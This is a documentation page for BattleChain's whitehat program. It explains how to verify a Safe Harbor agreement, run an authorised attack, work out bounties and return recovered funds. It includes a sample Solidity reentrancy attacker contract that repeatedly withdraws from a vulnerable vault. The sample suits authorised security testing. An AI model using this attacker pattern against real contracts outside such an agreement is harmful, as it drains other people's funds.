---
title: "Executing an Attack"
description: "How to legally attack contracts on BattleChain"
---

Once you've identified an attackable contract and verified its Safe Harbor agreement, you can execute your attack. This guide covers the process and requirements.

## Before You Attack

<Steps>
  <Step title="Verify Attack Status">
    Confirm the contract is still in `UNDER_ATTACK` or `PROMOTION_REQUESTED` state
  </Step>
  <Step title="Check Scope">
    Ensure all contracts you'll interact with are in the agreement's scope
  </Step>
  <Step title="Review Bounty Terms">
    Understand how much you can keep and where to send the rest
  </Step>
  <Step title="Note Recovery Address">
    Get the asset recovery address for returning funds
  </Step>
  <Step title="Check Identity Requirements">
    Know if you need to provide identity information
  </Step>
</Steps>

## Executing the Attack

Your attack transaction(s) should exploit the vulnerability. There are no restrictions on how you attack contracts in scope.

```solidity
// Example: Exploiting a reentrancy vulnerability
interface IVulnerableVault {
    function withdraw(uint256 amount) external;
}

contract Attacker {
    IVulnerableVault public vault;
    uint256 public attackCount;

    constructor(address _vault) {
        vault = IVulnerableVault(_vault);
    }

    function attack() external {
        // Deposit some funds first
        // Then exploit the reentrancy
        vault.withdraw(1 ether);
    }

    receive() external payable {
        if (attackCount < 10) {
            attackCount++;
            vault.withdraw(1 ether);
        }
    }
}
```

## Handling Recovered Funds

After a successful attack, you must handle the funds according to the agreement terms.

### Retainable Bounties

If `retainable = true`, keep your bounty and send the rest:

```solidity
// Check bounty terms
BountyTerms memory terms = agreement.getBountyTerms();

// Calculate your bounty
uint256 recovered = address(this).balance;
uint256 bountyPercent = terms.bountyPercentage;  // e.g., 10
uint256 bountyCap = terms.bountyCapUsd;  // e.g., 5_000_000

// Your bounty = min(recovered * bountyPercent / 100, bountyCapUsd)
// Note: You'll need to convert USD cap to token amounts using oracle

// Send remainder to recovery address
string memory recoveryAddr = agreement.getAssetRecoveryAddress("eip155:325");
address recovery = parseAddress(recoveryAddr);

// Keep your bounty, send the rest
uint256 toReturn = recovered - yourBounty;
payable(recovery).transfer(toReturn);
```

### Return-All Bounties

If `retainable = false`, send all funds to recovery:

```solidity
// Send ALL recovered funds to the recovery address
string memory recoveryAddr = agreement.getAssetRecoveryAddress("eip155:325");
address recovery = parseAddress(recoveryAddr);

uint256 recovered = address(this).balance;
payable(recovery).transfer(recovered);

// The protocol will pay your bounty separately
```

## Multi-Token Recoveries

For attacks involving multiple token types:

```solidity
// Get recovery address
address recovery = parseAddress(agreement.getAssetRecoveryAddress("eip155:325"));
BountyTerms memory terms = agreement.getBountyTerms();

// Handle each token type
// ETH
if (address(this).balance > 0) {
    uint256 ethBounty = calculateBounty(address(this).balance, terms);
    payable(recovery).transfer(address(this).balance - ethBounty);
}

// ERC20 tokens
IERC20[] memory tokens = getRecoveredTokens();
for (uint i = 0; i < tokens.length; i++) {
    uint256 balance = tokens[i].balanceOf(address(this));
    uint256 tokenBounty = calculateBounty(balance, terms);
    tokens[i].transfer(recovery, balance - tokenBounty);
}

// ERC721 NFTs (typically return 100%, NFTs aren't fungible for bounties)
IERC721[] memory nfts = getRecoveredNFTs();
for (uint i = 0; i < nfts.length; i++) {
    uint256[] memory tokenIds = getTokenIds(nfts[i]);
    for (uint j = 0; j < tokenIds.length; j++) {
        nfts[i].transferFrom(address(this), recovery, tokenIds[j]);
    }
}
```

## Bounty Calculations

### Single Whitehat

```
Your Bounty = min(Recovered × BountyPercentage%, BountyCapUsd)
```

Example:
- Recovered: $10M
- Bounty Percentage: 10%
- Bounty Cap: $5M
- Your Bounty: min($1M, $5M) = **$1M**

### With Aggregate Cap

If `aggregateBountyCapUsd > 0`, total bounties across all whitehats are capped:

```
Total Bounties ≤ AggregateBountyCapUsd
```

<Note>
If multiple whitehats exploit the same vulnerability, they share the aggregate cap proportionally. Coordinate with the protocol if this situation arises.
</Note>

## Timing Considerations

### Promotion Countdown

If the agreement is in `PROMOTION_REQUESTED` state, you have limited time:

```solidity
IAttackRegistry.AgreementInfo memory info = attackRegistry.getAgreementInfo(agreementAddress);

if (info.promotionRequestedTimestamp > 0) {
    uint256 productionAt = info.promotionRequestedTimestamp + 3 days;
    uint256 timeLeft = productionAt - block.timestamp;
    // Attack must complete before productionAt
}
```

### Front-Running Protection

Be aware that your attack transactions are public. Consider:
- Using Flashbots or private mempools
- Executing in a single atomic transaction
- Front-running protection services

## After the Attack

<Steps>
  <Step title="Verify Fund Distribution">
    Confirm recovery address received the correct amount
  </Step>
  <Step title="Document Everything">
    Keep records of the vulnerability, attack, and fund distribution
  </Step>
  <Step title="Meet Identity Requirements">
    If required, provide identity information to the protocol
  </Step>
  <Step title="Consider Disclosure">
    Check if the vulnerability affects other protocols or chains
  </Step>
</Steps>

<Warning>
**Mainnet Implications**

If your exploit reveals a vulnerability that exists on mainnet:

1. **Do not** publicly disclose details
2. **Contact** the protocol through their security contacts
3. **Consider** using traditional bug bounty for the mainnet issue
4. **Allow** time for the protocol to patch before disclosure
</Warning>

<Card title="Next: Claiming Bounties" icon="arrow-right" href="/whitehats/bounties">
  Learn about bounty terms and caps
</Card>
